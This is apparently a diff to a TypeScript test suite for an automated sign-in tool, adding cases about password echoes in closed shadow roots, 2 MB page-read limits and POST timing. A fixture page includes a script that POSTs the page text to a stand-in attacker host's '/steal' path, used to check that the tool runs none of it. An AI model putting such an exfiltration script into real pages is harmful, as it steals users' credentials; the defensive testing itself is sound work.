@@ -829,7 +829,15 @@ describe(signIn, () => {
         expect(login.hits.filter((hit) => hit.url.includes(SAVED_SECRET))).toStrictEqual([]);
     });
 
-    it("closes the session, and runs none of its script, when the reloaded page shows the password as text", async () => {
+    it.each([
+        ["as text", (echoed: string) => `<p>Signed in with ${echoed}</p>`],
+        // Out of reach of the page's own scripts, but not of a later read of the page.
+        ["in a closed shadow root", (echoed: string) => `<div><template shadowrootmode="closed"><p>Signed in with ${echoed}</p></template></div>`],
+        [
+            "in a closed shadow root nested deeper than one read of the page goes",
+            (echoed: string) => `${"<div>".repeat(200)}<span><template shadowrootmode="closed"><p>Signed in with ${echoed}</p></template></span>`,
+        ],
+    ])("closes the session, and runs none of its script, when the reloaded page shows the password %s", async (_where, shown) => {
         let echoed = "";
 
         fixture.page = loginForm();
@@ -841,8 +849,7 @@ describe(signIn, () => {
         // The site renders what it was sent, as a page could from its own records.
         Object.defineProperty(fixture, "home", {
             configurable: true,
-            get: () =>
-                `<p>Signed in with ${echoed}</p><script>fetch("${evil.origin}/steal", { body: document.body.textContent, method: "POST", mode: "no-cors" });</script>`,
+            get: () => `${shown(echoed)}<script>fetch("${evil.origin}/steal", { body: document.body.textContent, method: "POST", mode: "no-cors" });</script>`,
         });
 
         const result = await run();
@@ -919,9 +926,12 @@ describe(signIn, () => {
         expect(sessionPosts()).toStrictEqual([]);
     });
 
-    it("types nothing when the page's HTML as the site sent it cannot be read whole", async () => {
-        // Past the 2 MB the served HTML is read up to.
-        fixture.page = `${loginForm()}<!--${"x".repeat(2 * 1024 * 1024)}-->`;
+    it.each([
+        ["in characters", "x".repeat(2 * 1024 * 1024)],
+        // Sent as UTF-8 and read as windows-1252: 1.5 MB as sent, and each "é" two characters of two bytes as read.
+        ["in bytes", "é".repeat(768 * 1024)],
+    ])("types nothing when the page's HTML as the site sent it is past the 2 MB it is read up to %s", async (_how, filler) => {
+        fixture.page = `<meta charset="windows-1252">${loginForm()}<!--${filler}-->`;
 
         const result = await run();
 
@@ -931,6 +941,16 @@ describe(signIn, () => {
             success: false,
         });
         expect(await leftBlank()).toBe(true);
+    });
+
+    it("signs in when the page's HTML is just under the 2 MB it is read up to in bytes", async () => {
+        fixture.page = `<meta charset="utf-8">${loginForm()}<!--${"é".repeat(1024 * 1024 - 1024)}-->`;
+        // The page it lands on nests deeper than one read of it goes: the cleanup's look reads on.
+        fixture.home = `${"<div>".repeat(200)}<h1>Home</h1>`;
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
     });
 
     it("types nothing into a login form a script builds", async () => {
@@ -1346,6 +1366,35 @@ describe(signIn, () => {
 
         expect(result).toMatchObject({ submitted: false, success: false });
         expect(forwarded).toStrictEqual([]);
+    });
+
+    it("reports a POST as sent while its hand-on is still pending, and sends it once", async () => {
+        let offset = 0;
+        const returned = Promise.withResolvers<void>();
+        let handedOn = Promise.resolve();
+
+        // The POST goes out at once, but the hand-on returns only after the sign-in ended, the clock past its wait.
+        await aroundRoutes({
+            fallback: async (next, options, route) => {
+                if (options?.postData === undefined) {
+                    return next(options);
+                }
+
+                offset += 6000;
+                handedOn = route.continue(options).then(async () => returned.promise);
+
+                return handedOn;
+            },
+        });
+        fixture.page = loginForm();
+
+        const result = await run(() => Date.now() + offset);
+
+        returned.resolve();
+        await handedOn;
+
+        expect(result).toMatchObject({ submitted: true });
+        expect(sessionPosts()).toHaveLength(1);
     });
 
     it("reports a form POST that could not be handed on as not sent", async () => {
